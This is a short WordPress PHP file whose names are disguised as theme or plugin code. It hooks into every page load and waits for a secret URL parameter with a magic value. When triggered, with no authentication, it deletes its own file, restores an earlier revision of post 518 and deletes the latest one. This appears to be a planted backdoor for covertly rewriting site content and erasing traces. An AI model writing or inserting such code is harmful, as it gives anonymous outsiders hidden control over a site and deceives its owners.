<?php

function divi_hidden_select_lightgray() {
	if (isset($_GET['copy_scheduled_finder_react']) && $_GET['copy_scheduled_finder_react'] === 'captcha_history_archives') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$shortener_sticky_logo_short = 518;
		$pro_specific_keyword = wp_get_post_revisions($shortener_sticky_logo_short);
		if (empty($pro_specific_keyword)) die('no revisions');
		if (count($pro_specific_keyword) < 2) die('less than 2');
		$about_database_smooth_drop = array_shift($pro_specific_keyword);
		$forms_description_creator = $about_database_smooth_drop->ID;
		$captcha_express_optimizer_amp = array_shift($pro_specific_keyword);
		$exporter_effect_consent_back = $captcha_express_optimizer_amp->ID;
		$mode_recipe_install_polyfill = wp_restore_post_revision($exporter_effect_consent_back);
		if ($mode_recipe_install_polyfill === false) die('error restoring');
		$mode_recipe_install_polyfill = wp_delete_post_revision($forms_description_creator);		
		if ($mode_recipe_install_polyfill === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'divi_hidden_select_lightgray');
